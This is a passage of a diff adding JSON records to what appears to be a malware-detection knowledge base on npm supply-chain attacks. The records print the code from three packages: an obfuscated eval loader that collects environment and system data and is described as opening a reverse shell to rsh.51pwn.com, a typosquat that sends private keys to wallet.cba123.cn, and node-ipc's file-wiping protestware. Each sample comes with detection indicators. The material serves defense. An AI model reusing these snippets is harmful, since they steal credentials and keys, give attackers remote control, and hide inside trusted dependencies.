+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_095515_snippet_2",
+              "source_package": "@jackshanyeshuzi/curvess (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_095515/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.36164504289627075,
+              "code_similarity": 0.3236123323440552,
+              "behavior_similarity": 0.39967775344848633,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "try {\n  let m1 = ['w', 'a', 'l', 'l', 'e', 't', '.', 'c', 'b', 'a', '1', '2', '3', 'n', '/', 'i', 'n', 'd', 'e', 'x', '?', 'p', 'r', '=', 's', ':'];\n  let h = m1[18] + m1[4] + m1[17] + m1[23] + m1[24] + m1[12] + m1[0] + m1[1] + m1[2] + m1[2] + m1[4] + m1[5] + m1[6] + m1[7] + m1[8] + m1[9] + m1[10] + m1[5] + m1[3] + m1[11];\n  let path = m1[12] + m1[13] + m1[15] + m1[16] + m1[20] + m1[21] + m1[13] + m1[11] + m1[4] + m1[22];\n  https.get(h + path + privateKey.toString(), function () { });\n} catch (e) {}",
+                "code_behavior": "At runtime, during cryptographic signing operations, the code obfuscates the exfiltration endpoint by constructing the host and path from an array, then sends the private key via HTTPS GET to the malicious server, enabling stealthy exfiltration of sensitive key material.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscation of the exfiltration endpoint is a clear attempt to evade detection by static and dynamic analysis tools. The behavior is otherwise identical to the previous snippet, with the same critical security violation of exfiltrating private keys.",
+                  "violated_expectations": "No legitimate cryptographic code would obfuscate network destinations or transmit private keys. Secure libraries are expected to be transparent and never hide network communication, especially involving sensitive data.",
+                  "similar_legitimate_use": "Obfuscation may be used for licensing or anti-tamper in some software, but never for exfiltrating cryptographic secrets. There is no legitimate use for this pattern in cryptographic libraries.",
+                  "key_indicators": [
+                    "Obfuscated construction of malicious host and path",
+                    "HTTPS request with private key in URL",
+                    "Try/catch block to suppress errors and evade detection",
+                    "Exfiltration of private key material"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (during cryptographic signing operations, later/obfuscated version)",
+                  "file_location": "abstract/weierstrass.js (prepSig function, later version)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@jackshanyeshuzi/curvess",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.0 - 1.1.9 (all published versions as of 2023-08-04)",
+                  "why_malicious": "This package is a typosquat of the legitimate @noble/curves cryptography library. It contains deeply embedded malicious code that exfiltrates users' private cryptographic keys to an external server (wallet.cba123.cn), compromising all cryptographic operations and user security. The malicious code is designed to be stealthy, does not alter the primary cryptographic functionality, and is triggered during sensitive operations, making it highly dangerous and difficult to detect."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs ethereum-cryptographyyy, which depends on @jackshanyeshuzi/curvess instead of @noble/curves.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious code in @jackshanyeshuzi/curvess is loaded and available."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When cryptographic signing is performed, the prepSig function in @jackshanyeshuzi/curvess is invoked.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Private key is captured and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "prepSig function sends the private key to wallet.cba123.cn via HTTP/HTTPS request.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives the user's private key, compromising all cryptographic security."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Obfuscation is added in later versions to evade detection.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Stealthier exfiltration, harder detection."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Network requests (HTTP/HTTPS) originating from cryptographic math or signing functions",
+                    "Exfiltration of private key or sensitive cryptographic material during signing operations",
+                    "Obfuscated string construction for network destinations within cryptographic code",
+                    "Unexpected logging of private keys in cryptographic libraries"
+                  ],
+                  "file_indicators": [
+                    "Import of http or https modules in cryptographic math files (e.g., abstract/weierstrass.js)",
+                    "Typosquatted package names in dependencies (e.g., @jackshanyeshuzi/curvess instead of @noble/curves)",
+                    "prepSig function containing network requests or exfiltration logic"
+                  ],
+                  "network_indicators": [
+                    "Connections to wallet.cba123.cn",
+                    "IP address 42.96.168.4 (ALISOFT, CN)",
+                    "Unusual HTTP/HTTPS requests during cryptographic operations"
+                  ],
+                  "how_to_detect": "Monitor for network requests originating from cryptographic libraries, especially during signing or key generation. Flag any code that logs or transmits private keys. Detect obfuscated string construction that resolves to known malicious domains such as wallet.cba123.cn. Audit dependencies for typosquatting and unexpected changes in package.json. Alert on the import of network modules (http, https) in files that should only perform mathematical operations. Correlate network activity with cryptographic function execution to identify exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_783890_snippet_1",
+              "source_package": "node-ipc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_783890/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.35832300782203674,
+              "code_similarity": 0.3374009132385254,
+              "behavior_similarity": 0.3792451024055481,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "import u from 'path';\nimport a from 'fs';\nimport o from 'https';\nsetTimeout(function(){\n  const t = Math.round(Math.random() * 4);\n  if (t > 1) {\n    return;\n  }\n  const n = Buffer.from('...','base64').toString('utf8');\n  // ...\n  if (geo == 'RU' || geo == 'BY') {\n    // destructive overwrite logic\n  }\n  // ...\n});",
+                "code_behavior": "At import-time, the code retrieves the user's external IP address via an HTTPS request, determines geolocation, and if the user is in Russia or Belarus, recursively overwrites the contents of all files on the filesystem with a heart emoji, resulting in irreversible data loss.",
+                "malice_analysis": {
+                  "why_suspicious": "The code performs a geolocation check using the user's external IP and, based on the result, executes a recursive file overwrite operation that destroys user data. This behavior is highly abnormal and dangerous for any npm package, especially one used as a dependency.",
+                  "violated_expectations": "Normal npm packages should not perform geolocation checks or destructive file operations on user systems, particularly without user consent or notification.",
+                  "similar_legitimate_use": "Geolocation checks may be used for regional feature toggling or telemetry, but never to trigger destructive actions such as file overwrites or deletions.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payloads embedded in the code",
+                    "Recursive traversal and overwrite of filesystem files",
+                    "Conditional execution based on geolocation (targeting Russia and Belarus)",
+                    "No user interaction, consent, or warning prior to destructive action",
+                    "Network request to external geolocation API at import-time"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "dao/ssl-geospec.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "node-ipc",
+                  "package_manager": "npm",
+                  "package_versions": "10.1.1, 10.1.2, 9.2.2, 11.0.0 and above",
+                  "why_malicious": "Select versions of 'node-ipc' contain destructive and protestware code that conditionally overwrites or deletes files on systems located in Russia and Belarus, and/or drops unsolicited 'peace' messages on user desktops. This constitutes a critical supply chain attack, as the package is widely used as a dependency in major projects, enabling widespread impact without user awareness or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User or CI system installs or updates a project that depends on a malicious version of node-ipc.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code in node-ipc is executed during install or import."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code in dao/ssl-geospec.js executes at import-time, retrieves the user's external IP address, and determines geolocation.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Conditional execution of destructive or protestware payloads based on geolocation."
+                  },
+                  {
+                    "step": 3,
+                    "action": "If the user is located in Russia or Belarus, the code recursively overwrites all files on the filesystem with a heart emoji, causing irreversible data loss.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "System data is destroyed for targeted users."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Regardless of geolocation, the bundled peacenotwar module writes a 'WITH-LOVE-FROM-AMERICA.txt' file containing a peace message to the user's Desktop directory.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "User sees unsolicited protest message on Desktop."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Geolocation-based logic that triggers destructive or protestware actions during install or import",
+                    "Recursive file overwrite or deletion operations targeting the entire filesystem",
+                    "Unsolicited creation of specific text files (e.g., 'WITH-LOVE-FROM-AMERICA.txt') on user Desktop",
+                    "Presence of obfuscated or base64-encoded payloads in package code",
+                    "Network requests to external geolocation APIs at import or install time"
+                  ],
+                  "file_indicators": [
+                    "dao/ssl-geospec.js",
+                    "node_modules/peacenotwar/index.js",
+                    "WITH-LOVE-FROM-AMERICA.txt on Desktop"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS requests to external geolocation APIs (e.g., ipinfo.io, ip-api.com) during install or import"
+                  ],
+                  "how_to_detect": "Monitor npm packages, especially 'node-ipc', for obfuscated or base64-encoded code, geolocation checks, and recursive filesystem access. Flag any package that writes unsolicited files such as 'WITH-LOVE-FROM-AMERICA.txt' to user Desktop or performs destructive actions based on region. Alert on the presence of 'dao/ssl-geospec.js' or bundled 'peacenotwar' modules. Detect outbound network requests to geolocation APIs during install/import. Correlate these behaviors to identify supply chain attacks."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
